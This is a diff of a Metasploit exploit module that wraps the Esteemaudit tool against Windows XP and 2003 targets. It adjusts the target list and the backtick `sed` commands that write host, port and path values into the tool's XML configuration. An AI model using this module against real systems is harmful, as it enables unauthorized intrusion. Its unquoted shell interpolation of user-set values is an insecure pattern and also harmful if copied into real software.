@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	  ['XPSP1         Windows XP SP1',{}],
 	  ['XPSP0|1       Windows XP SP0 or SP1',{}],
 	  ['XPSP2         Windows XP SP2',{}],
-          ['XPSP3         Windows XP SP3',{}],
+    ['XPSP3         Windows XP SP3',{}],
 	  ['XPSP2|3       Windows XP SP2 or SP3',{}],
 	  ['W2K3SP0       Windows 2003 SP0',{}],
 	  ['W2K3SP1       Windows 2003 SP1',{}],
@@ -67,8 +67,8 @@ class MetasploitModule < Msf::Exploit::Remote
   sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
-  sed = `sed -i 's/%CHOST%/#{datastore['CHOST']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
-  sed = `sed -i 's/%CPORT%/#{datastore['CPORT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
+  sed = `sed -i 's|%WINEPATH%|#{datastore['WINEPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
+  sed = `sed -i 's|%ESTEEMAUDITPATH%|#{datastore['ESTEEMAUDITPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   
   if target.name =~ /Windows XP SP0/
